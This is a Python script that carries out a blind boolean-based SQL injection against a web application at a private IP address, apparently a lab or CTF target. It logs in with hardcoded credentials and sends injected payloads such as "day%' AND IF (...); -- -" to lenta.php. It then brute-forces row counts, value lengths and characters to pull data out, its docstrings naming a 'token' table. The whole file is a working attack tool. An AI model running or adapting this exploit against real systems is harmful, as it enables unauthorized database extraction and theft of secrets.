import requests
import re
from bs4 import BeautifulSoup

URL_lenta = "http://10.0.4.12/lenta.php"
URL_index = "http://10.0.4.12/index.php"
login = 'ivanov'
passwd = 'wijdfawfuawfdkjawifjorfdj3-jrf08ih-9w2kj2jdf9jg2i'
add_params = {'enter.x': 0, 'enter.y': 0}
proxy = {'http': 'http://127.0.0.1:8080'}

class Sqli():
    def __init__(self, cock):
        self.sqli_tmp_main = "day%' AND IF ({},True,False); -- -"
        self.sqli_tmp_asci = "Ascii(substring((SELECT {} FROM {} limit {},1),{},1)) = {}"
        self.sqli_tmp_notes_count = "(SELECT count({}) FROM {}) = {}"
        self.sqli_tmp_note_length = "(SELECT {} FROM {} limit {},1) LIKE '{}'"
        self.cock = cock
        if cock is None:
            res = requests.get(URL_index)
            secret = self._get_key(res.text)
            self.cock = res.cookies
            data = {secret[0]: login, secret[1]: passwd}
            # print(data)
            res_p = requests.post(URL_index, data = data, cookies = self.cock, proxies = proxy)

    def _get_key(self, page):
        soup = BeautifulSoup(page, 'lxml')
        secrets = soup.find_all('input')
        # print([i['name'] for i in secrets if i['name'] not in ('submit', 'enter', 'logoff')])
        return [i['name'] for i in secrets if i['name'] not in ('submit', 'enter', 'logoff')]

    def _check_condition(self, page):
        stop_word = "Not found"
        if stop_word not in page: return True
        else: return False

    def _make_huiquest(self, sql_query):
        res = requests.get(URL_lenta, cookies = self.cock, proxies = proxy)
        secret = self._get_key(res.text)
        data = {secret[0]: sql_query}
        res = requests.post(URL_lenta, data = data, cookies = self.cock, proxies = proxy)
        return res

    def get_notes_count(self, sql_raw_, sql_table_):
        """
        Great q: 
        day%' and if ((select count(token) from token)=72,True, False); -- -
        """
        i = 0
        while True:
            query = self.sqli_tmp_main.format(self.sqli_tmp_notes_count.format(sql_raw_, sql_table_, i))
            res = self._make_huiquest(query)
            if self._check_condition(res.text) is True:
                print(f"Table {sql_table_} contains {i} notes for {sql_raw_} raw ")
                return i
            i += 1

    def get_note_length(self, sql_raw_, sql_table_, count_of_notes):
        """
        Great q: 
        day%' AND IF ('I' like '_',True,False); -- -
        where True AND IF ((select b.a from (SELECT c.id as a FROM `docs` c limit 0,1) b where b.a like '__'),True,False)
        day%' and if ((select count(token) from token) like '_',True, False); -- -
        day%' AND IF ((SELECT token FROM token limit 0,1) like '___________',True,False); -- -
        """
        notes_length = {}
        for i in range(0, count_of_notes):
            wildcard = '_'
            while True:
                query = self.sqli_tmp_main.format(self.sqli_tmp_note_length.format(sql_raw_, sql_table_, i, wildcard))
                res = self._make_huiquest(query)
                if self._check_condition(res.text) is True:
                    print(f"{i+1} Note contains {len(wildcard)} chars")
                    notes_length.update({i: len(wildcard)})
                    break
                wildcard = wildcard + '_'
        # print(notes_length)
        return notes_length

    def guess_notes(self, sql_raw_, sql_table_, notes_length_):
        """
        Great q:
        day%' and if (Ascii(substring((select token from token limit 1),1,1))=73,True,False); -- -
        """
        ascii_let = [i for i in range(32,127)]
        words = {}
        for note_num in notes_length_:
            final_word = ''
            for note_len in range(1, notes_length_[note_num] + 1):
                for let_ in ascii_let:
                    query = self.sqli_tmp_main.format(self.sqli_tmp_asci.format(sql_raw_, sql_table_, note_num, note_len, str(let_)))
                    res = self._make_huiquest(query)
                    if self._check_condition(res.text) is True:
                        final_word = final_word + chr(let_)
                        # print(final_word)
                        break
            print(final_word)
            words.update({note_num: final_word})
        return words


    def maintance_act(self, sql_raw, sql_table):
        notes_count = self.get_notes_count(sql_raw, sql_table)
        note_length = self.get_note_length(sql_raw, sql_table, notes_count)
        notes = self.guess_notes(sql_raw, sql_table, note_length)

    def take_query(self):
        while True:
            sql_raw = input("SELECT ")
            sql_table = input("FROM ")
            
            self.maintance_act(sql_raw, sql_table)


if __name__ == "__main__":
    cookie = None
    a = Sqli(cookie)
    a.take_query()
